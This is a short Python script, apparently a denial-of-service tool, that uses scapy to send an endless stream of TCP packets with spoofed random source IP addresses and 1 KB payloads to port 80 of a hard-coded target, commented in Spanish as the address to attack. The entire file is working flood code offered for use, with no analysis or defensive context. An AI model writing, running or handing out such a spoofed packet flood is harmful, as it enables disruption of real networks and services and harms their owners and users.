import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR) 
from scapy.all import *
from faker import Faker

conf.verb = 0

fake = Faker()

#ip a atacar
host = "192.168.0.1"
port = 80

packet_number = 0

while True:    
    packet_number += 1 
    origenIP = fake.ipv4_private()
    packet = scapy.all.IP(src= (origenIP), dst= host) / scapy.all.TCP(sport= RandShort(), dport= port)/Raw(b"X"*1024)
    send(packet, inter= 0.0002)  
    print("Packet %d sent" %packet_number)
